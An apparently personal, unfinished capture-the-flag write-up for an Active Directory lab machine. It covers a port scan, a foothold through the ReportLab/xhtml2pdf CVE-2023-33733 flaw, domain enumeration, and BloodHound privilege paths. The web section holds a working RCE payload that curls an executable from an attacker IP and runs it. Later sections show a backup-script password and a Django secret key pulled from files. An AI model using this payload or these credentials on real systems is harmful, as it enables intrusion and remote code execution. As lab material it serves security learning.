## HOST RECON


```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49683/tcp open  unknown
49700/tcp open  unknown
52980/tcp open  unknown
```


## WEB RECON

#### This machine has many foothold possibilities, I was stuck for a long time trying to find it alone but I couldn't and I had to ask for help.


#### web foothold

O foothold é uma vulnerabilidade em uma biblioteca python que é usada para traformar html em pdf, conhecida como o foothold é uma vulnerabilidade em uma biblioteca python que é usada para traformar html em pdf, conhecida como xhtml2pdf da ReportLab.

```
└─$ strings profile.pdf| grep http    
 ReportLab Generated PDF document http://www.reportlab.com
/Author () /CreationDate (D:20241203180614+08'00') /Creator (\(unspecified\)) /Keywords () /ModDate (D:20241203180614+08'00') /Producer (xhtml2pdf <https://github.com/xhtml2pdf/xhtml2pdf/>) 
% ReportLab generated PDF document -- digest (http://www.reportlab.com)
```

1 - create a student account

2 - go to profile

3 - put payload in bio field and save

4 - to trigger payload download profile in "Profile Export"

5 - https://github.com/c53elyas/CVE-2023-33733

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://10.10.14.10:8000/xeu.exe -o xeu.exe && .\xeu.exe') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('xeu.exe') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

## Shell as wao

```
PS C:\users\wao> whoami /all

USER INFORMATION
----------------

User Name      SID                                          
============== =============================================
university\wao S-1-5-21-2056245889-740706773-2266349663-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
UNIVERSITY\Web Developers                  Group            S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group
Service asserted identity                  Well-known group S-1-18-2                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


```
PS C:\users\wao> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
A.Crouz                  Administrator            Alice.Z                  
Arnold.G                 Brose.W                  C.Freez                  
Choco.L                  Emma.H                   George.A                 
Guest                    hana                     Jakken.C                 
John.D                   Kai.K                    Kareem.A                 
karma.watterson          Karol.J                  krbtgt                   
Leon.K                   Lisa.K                   Martin.T                 
Nya.R                    Rose.L                   Steven.P                 
WAO                      William.B                
The command completed with one or more errors.
```


```
PS C:\users\wao> net group /domain

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*Content Evaluators
*Customer Support
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Help Desk
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Research & Development
*Schema Admins
*SecurityOps
*Web Developers
The command completed with one or more errors.
```

```
#### winpeas


???????????? Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Choco.L
    C:\Users\Default
    C:\Users\Default User
    C:\Users\John.D
    C:\Users\Nya.R
    C:\Users\Public : Batch [WriteData/CreateFiles]
    C:\Users\Rose.L
    C:\Users\WAO : WAO [AllAccess]


???????????? Checking write permissions in PATH folders (DLL Hijacking)
? Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Program Files\Python310\Scripts\
    C:\Program Files\Python310\
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    (DLL Hijacking) C:\Program Files (x86)\gnupg\bin: WAO [AllAccess]
```

```
PS C:\web\DB Backups> cat db-backup-automator.ps1
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

```
PS C:\web\University\university> cat settings.py

SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'django-insecure-fs-2bin)f_nd1q5jly9_g8$9e$2y2_zy!pn=*qji^i*-v5yt7#'
```


## BloodHound data

```
- a.crouz ---> MemberOf ---> Cutomer Support
  |__ no outbound
  |__ inbound ---> Members of Account Operators ---> has GenericAll over a.crouz

- arnold.g ---> MemberOf ---> Cutomer Support
  |__ no outbound
  |__ inbound ---> Members of Account Operators ---> has GenericAll over arnold.g

- choco.l ---> high rights

- john.d ---> MemberOf ---> Research & Development, Account Operators
  |__ outbound ---> Has many possibilities with GenericAll over users, groups and computers

- karma.watterson ---> MemeberOf ---> Remote Management Users, Help Desk, Account Operators
  |__ outbound ---> MemeberOf ---> Help Desk ---> has GenericAll over ---> Account Operators memebers

- leon.k ---> inbound ---> account operators members has ---> GeneriAll over leon.k

- nya.r ---> MemberOf ---> Research & Development, Content Evaluators
  |__ no outbound
  |__ inbound account operators members has ---> GeneriAll over nya.r

- WAO ---> MemberOf ---> Remote Management Users, Web Developers
  |___ HasSession ---> over Computer account dc.university

- brose.w ---> MemberOf ---> Remote Management Users, Backup Operators, Help Desk, Account Operators
  |__ outbound ---> Has many possibilities with GenericAll over users, groups and computers

- emma.h ---> MemeberOf ---> Web Developers
  |__ outbound ---> account operators members has ---> GeneriAll over hana

- hana ---> MemeberOf --> Server Operator
  |__ no in or outbound

- kai.k ---> inbound ---> account operators members has ---> GeneriAll over kai.k

- karol.j ---> MemberOf ---> Research & Development
  |__ outbound ---> account operators members has ---> GeneriAll over karol.j

- lisa.k ---> MemberOf ---> Remote Management Users, SecurityOps
  |__ inbound ---> account operators members has ---> GeneriAll over lisa.k

- rose.l ---> MemeberOf ---> Remote Management Users, Account Operators, Help Desk
  |__ outbound ---> Has many possibilities with GenericAll over users, groups and computers
  |__ HasSession ---> over Computer account dc.university

- william.b ...

- alice.z ---> MemeberOf ---> Remote Management Users, Account Operators, Help Desk
  |__ outbound ---> Has many possibilities with GenericAll over users, groups and computers

- c.freez ---> MemberOf ---> Customer Support 
  |__ inbound ---> account operators members has ---> GeneriAll over c.freez

- george.a ---> MemeberOf ---> Content Evaluators
  |__ inbound ---> account operators members has ---> GeneriAll over george.a

- jakken.c ---> MemeberOf ---> Content Evaluators
  |__ inbound ---> account operators members has ---> GeneriAll over jakken.c

- kareem.a ---> MemberOf ---> SecurityOps
  |__ inbound ---> account operators members has ---> GeneriAll over kareem.a

- martin.t ---> MemberOf ---> Research & Development, Content Evaluators
  |__ inbound ---> account operators members has ---> GeneriAll over martin.t

- steven.p ---> MemberOf ---> Web Developers
  |__ inbound ---> account operators members has ---> GeneriAll over steven.t
```

#### help step bro im stuck